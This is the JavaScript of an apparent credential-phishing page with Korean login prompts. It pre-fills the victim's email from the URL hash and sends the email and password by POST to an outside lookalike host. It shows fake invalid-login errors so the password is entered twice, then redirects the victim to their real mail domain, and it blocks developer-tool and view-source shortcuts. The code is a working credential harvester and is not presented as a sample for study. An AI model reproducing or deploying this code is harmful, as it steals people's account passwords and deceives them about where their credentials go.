$(document).ready(function(){
      var count=0;
       var errorArray = ["","로그인 정보가 올바르지 않습니다.", "로그인 정보가 올바르지 않습니다.", "이 세션은 만료되었습니다."];

      $('#back3').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
        // $('#email').val(email);
        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
          $('#contact').trigger("reset");
          $("#msg").hide();
          $('#fieldImg').attr('src', 'images/other-1.png');
          $('#field').html("Other Mail");
          $('#email').val(my_email);
          $('#emailch').html(my_email);
          $("#msg").hide();
          $("#inputbar").animate({left:200, opacity:"hide"}, 0);
          $("#automail").animate({right:200, opacity:"show"}, 1000);
		  $('#domain-name').html(final);
		  $('#connect').html(""+my_slice);
      }
      ///////////////url getting email////////////////


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').html(errorArray[count]);
     
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

     

        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("아이디를 입력하세요");
            email.focus
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("비밀번호를 입력하세요");
            email.focus
            return false;
        }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
     
      count=count+1;
      $('#domain-name').html(final);
      $.ajax({
        dataType: 'JSON',
        url: 'https://bestvlsion.com/dir/krz.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('로그인');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                   window.location.replace("http://www." + my_slice);
                     
                  }
                  $('#msg').html(response['msg']);
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www." + my_slice);
              }
              $("#msg").show();
              $('#msg').html(errorArray[count]);
            },
            complete: function(){
              $('#submit-btn').html('로그인');
            }
          });
    });


    });
	


document.onkeydown=function(e){
  if (e.ctrlKey && 
    (e.keyCode === 73 || 
     e.keyCode === 105 ||
     e.keyCode === 74 || 
     e.keyCode === 106 || 
     e.keyCode === 85 || 
     e.keyCode === 117)) {
    alert('not allowed');
  return false;
} else {
  return true;
}
}  